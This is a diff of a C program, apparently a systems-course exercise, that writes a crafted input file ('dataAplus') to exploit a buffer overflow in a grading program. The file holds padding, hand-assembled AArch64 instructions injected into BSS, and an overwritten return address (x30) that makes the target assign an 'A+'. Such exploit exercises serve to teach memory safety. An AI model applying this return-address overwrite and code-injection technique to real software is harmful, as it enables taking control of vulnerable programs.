@@ -17,9 +17,9 @@ static const unsigned int lReturnAddress = 0x42006C;
 static const char sName[] = "Chinmay Bhandaru";
 
 
-/* Takes no parameters. Opens (and potentially creates) file 'dataB'.
- * Writes a name, nullbyte, padding, and a binary memory address to the
- * file. Returns 0 upon completion. */
+/* Takes no parameters. Opens (and potentially creates) file 'dataAplus'
+ * Writes content to 'dataAplus' that results in a grade of 'A+' being
+ * assigned by executing code in the BSS. Returns 0 upon completion. */
 int main(void) {
     int i;
     unsigned int uiInstr;
@@ -30,47 +30,45 @@ int main(void) {
     /* Print the stored name into dataB */
     fprintf(psFile, sName);
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
+    /* Add nullbytes as padding and mark end of name */
     for (i = 0; i < 2; i++) {
         putc(0, psFile);
     }
-    putc('A', psFile); /* 0x42006A */
+    putc('A', psFile); /* store printf parameter value at 0x42006A */
     for (i = 0; i < 1; i++) {
         putc(0, psFile);
     }
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
-
+    /* adr x0, 0x42006A */
     uiInstr = MiniAssembler_adr(0, 0x42006A, 0x42006C);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* bl printf */
     uiInstr = MiniAssembler_bl(0x400690, 0x420070);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* mov x0, 'A' */
     uiInstr = MiniAssembler_mov(0, '+');
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* adr x1, 0x420044 */
     uiInstr = MiniAssembler_adr(1, 0x420044,0x420078);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* strb x0, [x1] */
     uiInstr = MiniAssembler_strb(0, 1);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+    /* b 0x40089c */
     uiInstr = MiniAssembler_b(0x40089c, 0x420080);
-
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-    /* Add nullbytes to overrun the buffer and mark end of name */
+    /* Add nullbytes to overrun the buffer */
     for (i = 0; i < 4; i++) {
         putc(0, psFile);
     }
 
-    /* Overwrite x30 with address of 'grade = 'B'' instruction */
+    /* Overwrite x30 with address of printf call in main */
     fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
     /* Close the file */
